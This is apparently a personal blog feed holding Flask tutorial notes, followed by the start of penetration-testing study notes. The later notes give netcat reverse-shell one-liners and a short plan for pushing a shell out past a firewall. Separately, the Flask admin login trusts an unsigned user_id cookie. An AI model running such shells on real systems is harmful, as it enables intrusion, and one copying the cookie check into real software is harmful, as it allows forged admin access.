class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5、路由参数"><a href="#5、路由参数" class="headerlink" title="5、路由参数"></a>5、路由参数</h2><blockquote>
<p>string  接收如何没有斜杠(‘&#x2F;‘)的字符串(默认)</p>
<p>int  接收整型</p>
<p>float   接收浮点型</p>
<p>path  接收路径，可接收斜线(‘&#x2F;‘)</p>
<p>uuid   只接受uuid字符串，唯一码，一种生成规律（uuid是一段特定的字符串，基本无法伪造）</p>
<p>any   可以同时指定多种路径，进行限定</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/any/&lt;any(apple, orange, banana):fruit&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_any</span>(<span class="params">fruit</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fruit))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(fruit)</span><br></pre></td></tr></table></figure>

<p>any表示限定只能在给定的之中选择</p>
<h2 id="6、路由请求方法的指定"><a href="#6、路由请求方法的指定" class="headerlink" title="6、路由请求方法的指定"></a>6、路由请求方法的指定</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure>

<p>设置该路由可以由GET和POST这两种请求方法区访问</p>
<p>一些最常见的请求方式</p>
<blockquote>
<p>GET</p>
<p>POST</p>
<p>PUT</p>
<p>DELETE</p>
</blockquote>
<h1 id="四、flask中四个全局变量"><a href="#四、flask中四个全局变量" class="headerlink" title="四、flask中四个全局变量"></a>四、flask中四个全局变量</h1><p>**</p>
<table>
<thead>
<tr>
<th><strong>变量</strong></th>
<th><strong>上下文</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>current_app</td>
<td>应用上下文</td>
<td>相当与在主程序中激活的实例化app（<code>app=Flask(__name__)</code>）</td>
</tr>
<tr>
<td>g</td>
<td>应用上下文</td>
<td>一次性函数，处理请求的临时变量。只在一个请求中被应用，下个请求开始时会自动重置</td>
</tr>
<tr>
<td>request</td>
<td>请求上下文</td>
<td>请求对象。存放了客户端发来的HTTP信息</td>
</tr>
<tr>
<td>session</td>
<td>请求上下文</td>
<td>记录用户和服务器之间的会话的。在服务器端记录需要记住的信息。（和cookie对应，cookies是记录在客户端的）</td>
</tr>
</tbody></table>
<p><strong>request中的一些用法:</strong></p>
<blockquote>
<p>url   完整请求地址</p>
<p>base_url   去掉GET参数的URL</p>
<p>host_url   只有主机和端口号的URL</p>
<p>path  路由中的路径</p>
<p>method 请求方式</p>
<p>remote_addr  请求的客户端地址</p>
<p>args   GET请求参数</p>
<p>form   POST请求参数</p>
<p>files   文件上传</p>
<p>headers  请求头</p>
<p>cookies   请求头中的cookie</p>
</blockquote>
<h1 id="五、钩子函数装饰器"><a href="#五、钩子函数装饰器" class="headerlink" title="五、钩子函数装饰器"></a>五、钩子函数装饰器</h1><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>before_first_request</td>
<td>处理第一次请求之前</td>
</tr>
<tr>
<td>before_request</td>
<td>在每次请求之前，通常利用这个处理一些变量，实现反爬</td>
</tr>
<tr>
<td>app.after_request</td>
<td>注册一个函数，如果没有未处理的异常抛出，每次请求结束后运行</td>
</tr>
<tr>
<td>app.teardown_request</td>
<td>有异常也会运行，每次请求结束后。当APP上下文被移除后执行的函数，可以进行数据库的提交和回滚</td>
</tr>
</tbody></table>
<p>使用示例：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="六、Flask的一些插件的使用"><a href="#六、Flask的一些插件的使用" class="headerlink" title="六、Flask的一些插件的使用"></a>六、Flask的一些插件的使用</h1><h2 id="1、flask-caching"><a href="#1、flask-caching" class="headerlink" title="1、flask-caching"></a>1、flask-caching</h2><p>安装</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install flask-caching</span><br></pre></td></tr></table></figure>

<p>初始化</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cache = Cache(config=&#123;</span><br><span class="line">    <span class="string">&#x27;CACHE_TYPE&#x27;</span>: <span class="string">&#x27;simple&#x27;</span>  <span class="comment">#缓存类型</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>添加缓存</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">20</span></span>)   </span><span class="comment">#使缓存存在20秒</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;index2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(g.star)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对反爬的相关应用</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(request.path)</span><br><span class="line">    <span class="built_in">print</span>(request.method)</span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#简单的反爬</span></span><br><span class="line">    <span class="built_in">print</span>(request.user_agent)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;您正在使用python爬虫，再见！&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#针对ip作反爬</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> cache.get(ip):</span><br><span class="line">        <span class="comment">#做了个拦截，不会进入视图函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;小伙子，别爬了！&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#对每个ip设置一个缓存，1秒内不让重复访问</span></span><br><span class="line">        cache.<span class="built_in">set</span>(ip, <span class="string">&#x27;value&#x27;</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h1 id="七、前后端分离模式"><a href="#七、前后端分离模式" class="headerlink" title="七、前后端分离模式"></a>七、前后端分离模式</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/7a211a47e9bdbf3195d69d8b36829d3b--ad35--image-20231119204503992.png" alt="image-20231119204503992"></p>
<p>将原本的views拆分为urls和apis。</p>
<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  路由文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> api</span><br><span class="line"><span class="keyword">from</span> .apis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">api.add_resource(HelloResource, <span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">api.add_resource(UserResource, <span class="string">&#x27;/user/&#x27;</span>, endpoint=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">api.add_resource(User2Resource, <span class="string">&#x27;/user2/&#x27;</span>)</span><br><span class="line">api.add_resource(User4Resource, <span class="string">&#x27;/user4/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>apis.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_restful <span class="keyword">import</span> Resource, fields, marshal_with, reqparse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类视图  CBV</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloResource</span>(<span class="title class_ inherited__">Resource</span>):   <span class="comment">#必须要继承Resource</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;get请求&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;post请求&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-RESTful</span></span><br><span class="line">ret_field = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;like&#x27;</span>: fields.String(default=<span class="string">&#x27;ball&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;data2&#x27;</span>: fields.String(attribute=<span class="string">&#x27;data&#x27;</span>) <span class="comment">#类似于引用，将data的值给一个另外名字的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserResource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field</span>)     </span><span class="comment">#flask的一个拓展，用以规范后端返回数据的格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;千峰教育Python&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_fields = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: fields.Url(endpoint=<span class="string">&#x27;id&#x27;</span>, absolute=<span class="literal">True</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret_field2 = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.Nested(user_fields)  <span class="comment">#获取一个列表数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field2</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        user = User.query.first()   <span class="comment">#从数据库中拿出数据</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: user</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解析  完成前端数据的返回</span></span><br><span class="line">parser = reqparse.RequestParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;name&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;name是必须的&#x27;</span>)   </span><br><span class="line">parser.add_argument(<span class="string">&#x27;age&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, action=<span class="string">&#x27;append&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User4Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        age = args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;age&#x27;</span>: age&#125;</span><br></pre></td></tr></table></figure>

<h1 id="八、数据表之间的操作"><a href="#八、数据表之间的操作" class="headerlink" title="八、数据表之间的操作"></a>八、数据表之间的操作</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一对多</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grade</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;grade&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#建立关联</span></span><br><span class="line">    <span class="comment">#定义班级表的一对多关系，不是字段，Student为学生表模型，backref为反向查找名称</span></span><br><span class="line">    students = db.relationship(<span class="string">&#x27;Student&#x27;</span>, backref=<span class="string">&#x27;grade&#x27;</span>, lazy=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;student&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">    <span class="comment">#创建外键，关联到班级表的主键，实现一对多关系，班级表中也要有对应操作</span></span><br><span class="line">    gradeid = db.Column(db.Integer, db.ForeignKey(Grade.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多对多    </span></span><br><span class="line"><span class="comment">#中间表（不是类）    </span></span><br><span class="line">collect = db.Table(</span><br><span class="line">    <span class="string">&#x27;collects&#x27;</span>,</span><br><span class="line">    <span class="comment">#user_id为表字段名称，user.id未外键表的id</span></span><br><span class="line">    db.Column(<span class="string">&#x27;user_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;usermodel.id&#x27;</span>), primary_key=<span class="literal">True</span>),</span><br><span class="line">    db.Column(<span class="string">&#x27;movie_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;movie.id&#x27;</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModel</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;usermodel&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;movie&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#多对多  关联的学生摆个的模型   中间表的名称   反向查找</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;UserModel&#x27;</span>, backref=<span class="string">&#x27;movies&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>, secondary=collect)</span><br></pre></td></tr></table></figure>

<p>lazy属性</p>
<blockquote>
<p>dynamic：    会返回一个query对象(查询集)，可以继续使用其他查询方法，如all()</p>
<p>select：    首次访问到属性的时候，就会加载该属性的数据</p>
<p>joined：    在对关联的两个表进行join操作，从而获取到所有相关的对象</p>
<p>True：    返回一个可用的列表对象，同select</p>
</blockquote>
<h1 id="九、前端页面渲染的一些函数操作"><a href="#九、前端页面渲染的一些函数操作" class="headerlink" title="九、前端页面渲染的一些函数操作"></a>九、前端页面渲染的一些函数操作</h1><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>capitalize</td>
<td>首字母大写</td>
</tr>
<tr>
<td>upper</td>
<td>全部大写</td>
</tr>
<tr>
<td>lower</td>
<td>全部小写</td>
</tr>
<tr>
<td>title</td>
<td>每个单词首字母大写</td>
</tr>
<tr>
<td>trim</td>
<td>去掉两边的空白</td>
</tr>
<tr>
<td>striptags</td>
<td>去掉所有的HTML标签</td>
</tr>
<tr>
<td>safe</td>
<td>即删除标签，又保留标签功能</td>
</tr>
</tbody></table>
<p>我们就可以在html页面中去使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123; name|capitalize &#125;&#125; ! <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以去便利我们对参数的使用</p>
<h1 id="十、实践操作–个人简易博客的搭建"><a href="#十、实践操作–个人简易博客的搭建" class="headerlink" title="十、实践操作–个人简易博客的搭建"></a>十、实践操作–个人简易博客的搭建</h1><h2 id="1、更加清晰分明的文件结构："><a href="#1、更加清晰分明的文件结构：" class="headerlink" title="1、更加清晰分明的文件结构："></a>1、更加清晰分明的文件结构：</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/650f1da2ad366d5775354e62a0abfe6f--661f--image-20231125193419163.png" alt="image-20231125193419163"></p>
<p>由于需要有前端显示和后端管理两个层面，所以将视图文件，模板文件，以及静态文件分为两个，并且专门创建了一个文件夹去存放，这样就能去更清晰的去文件分类。</p>
<h2 id="2、代码编写中的一些知识学习"><a href="#2、代码编写中的一些知识学习" class="headerlink" title="2、代码编写中的一些知识学习"></a>2、代码编写中的一些知识学习</h2><h3 id="1-装饰器的使用"><a href="#1-装饰器的使用" class="headerlink" title="1)装饰器的使用"></a>1)装饰器的使用</h3><p>对登录界面使用装饰器进行简化，并且解决flask中使用两次同个装饰器的报错。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="comment">#装饰器 ---登入验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">fn</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">fn</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        user_id = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user_id:</span><br><span class="line">            user = AdminUserModel.query.get(user_id)</span><br><span class="line">            request.user = user</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin/login/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure>

<h3 id="2-前端js代码的修改"><a href="#2-前端js代码的修改" class="headerlink" title="2)前端js代码的修改"></a>2)前端js代码的修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#main table tbody tr td a&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> that = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> id = that.<span class="title function_">attr</span>(<span class="string">&quot;aid&quot;</span>);  <span class="comment">//对应id</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">srcElement</span>.<span class="property">outerText</span> == <span class="string">&quot;删除&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;此操作不可逆，是否确认？&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                $.<span class="title function_">post</span>(<span class="string">&#x27;/admin/delarticle/&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: id&#125;, <span class="keyword">function</span> (<span class="params">data</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    <span class="keyword">if</span>(data.<span class="property">code</span> == <span class="number">200</span>)&#123;</span><br><span class="line">                        location.<span class="title function_">reload</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@admin.route(<span class="params"><span class="string">&#x27;/admin/delarticle/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_del_article</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        article = ArticleModel.query.get(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.delete(article)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>, e)</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除失败！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">400</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;请求方式错误！&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>进行前后端的数据交互，通过判断请求方法区决定不同的操作对于路由而言，从而去实现不同的功能，这里就是去利用了json数据与前端的交互，从而完成了页面相应和后台数据的关联。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试学习之路</title>
    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
<span id="more"></span>

<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
<p>一些参考的资料工具网站</p>
<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
</blockquote>
<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
<p>Windows：nc -e cmd ip port</p>
<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
</blockquote>
<p>内网可以连接外网，外网无法去连接内网。</p>
<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
<p>②将cmd权限发出，并使用外网主机接受</p>
<p>③拿到权限，从而去完成渗透</p>
